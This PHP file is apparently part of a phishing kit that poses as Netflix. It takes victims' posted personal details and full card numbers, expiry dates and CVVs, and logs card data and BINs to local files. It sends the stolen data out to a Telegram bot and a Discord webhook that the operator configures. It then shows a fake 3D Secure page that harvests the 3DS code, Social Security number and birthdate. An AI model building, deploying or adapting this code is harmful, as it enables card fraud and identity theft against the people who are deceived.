<?php
require 'results/geo.php';
$chatId = trim(file_get_contents("admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("admin/config/discord.ini"));
extract($_REQUEST);
$file = fopen("results/log.txt", "a");


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$Name = $_POST["name"];
$Addr = $_POST["adr"];
$Zip = $_POST["zip"];
$City = $_POST["city"];
$Sta = $_POST["state"];
$Countr = $_POST["country"];
$Ph = $_POST["phone"];
$CC = str_replace(' ', '', $_POST["cnm"]);
$EXP = $_POST["exp"];
$Cvv = $_POST["csc"];
$bin = substr($CC, 0, 6);
$ctp = $_POST["ctp"];

# Format for log.txt file
// Here variable $a is just an example (replace with your own variables)
$file1 = fopen("results/cc.txt", "a");
fwrite($file1, $cnm." | ".$exp." | ".$csc);
fwrite($file1, "\n");
fclose($file1);

$file2 = fopen("results/bin.txt", "a");
fwrite($file2, $bin);
fwrite($file2, "\n");
fclose($file2);

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "< M O R E  I N F O > >🧍\n > Name: $Name \n  > Address: $Addr \n  > Zip: $Zip \n  > City: $City \n  > State: $Sta \n  > Country: $Countr \n  > Phone: $Ph \n
< C C  I N F O > >💳\n  > Cc: $CC \n  > Exp: $EXP \n  > Cvv: $Cvv \n  > Bin: $bin \n  > Type: $ctp \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on") {
    $send = ['chat_id' => $chatId, 'text' => $txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on") {
    $web_discord = $webhookUrl;
    $json_data = array('content' => "$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init($web_discord);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
</head>

<body>
    <center>
        <?php
        $ccNum = $_POST["cnm"];
        function getTruncatedCCNumber($ccNum)
        {
            return str_replace(range(0, 9), "X", substr($ccNum, 0, -4)) . substr($ccNum, -4);
        }
        ?>
        <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px"><?php $ctp = $_POST["ctp"];
                                                                                        if ($ctp == 'visa') {
                                                                                            echo '<img src="assets/img/vsa.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'mastercard') {
                                                                                            echo '<img src="assets/img/master.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'amex') {
                                                                                            echo '<img src="assets/img/amx.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'diners_club_international') {
                                                                                            echo '<img src="assets/img/icon_dinersclub_v2.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'dankort') {
                                                                                            echo '<img src="assets/img/dankort.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'discover') {
                                                                                            echo '<img src="assets/img/discover.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } elseif ($ctp == 'jcb') {
                                                                                            echo '<img src="assets/img/jcb.png" style="width: 50px;float:left;">';
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } else {
                                                                                            echo '<img src="assets/img/nfLogo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';
                                                                                        } ?><div style="clear:both"></div>
            <p style="font-size:13px;margin-top:25px;color:#807979"> Please enter your Security Code </p>
            <form method="post" action="config2.php">
                <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                    <tbody>
                        <tr>
                            <td align="right">Date :</td>
                            <td><?php echo date("d-m-Y") ?></td>
                        </tr>
                        <tr>
                            <td align="right">Credit Card :</td>
                            <td><?php echo getTruncatedCCNumber($ccNum); ?></td>
                        </tr>
                        <tr>
                            <td align="right">Name :</td>
                            <td><?php $name = $_POST["name"];
                                echo $name; ?></td>
                        </tr>
                        <tr>
                        <tr>
                            <td align="right">3D Secure :</td>
                            <td><input style="width: 75px;" type="password" name="thd" required></td>
                        </tr>
                        <tr>
                            <td align="right">Social Security Number :</td>
                            <td><input placeholder="xxx-xx-xxxx" class="social" style="width: 85px;" name="ssn"></td>
                        </tr>
                        <tr>
                            <td align="right">Birthdate :</td>
                            <td class="xx"><input placeholder="MM" name="dob_month" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text"> - <input placeholder="DD" name="dob_day" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text"> - <input placeholder="YY" name="dob_year" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text"></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td><br><input style="width:74px" type="submit" value="Submit"></td>
                        </tr>
                        </tr>
                    </tbody>
                </table>
            </form>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999- <?php echo date("Y"); ?> . All rights reserved. </p>
        </div>
        <div id="rotate" style="display:none">
            <div class="circle">
                <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
        </div>
    </center>


</body>

</html>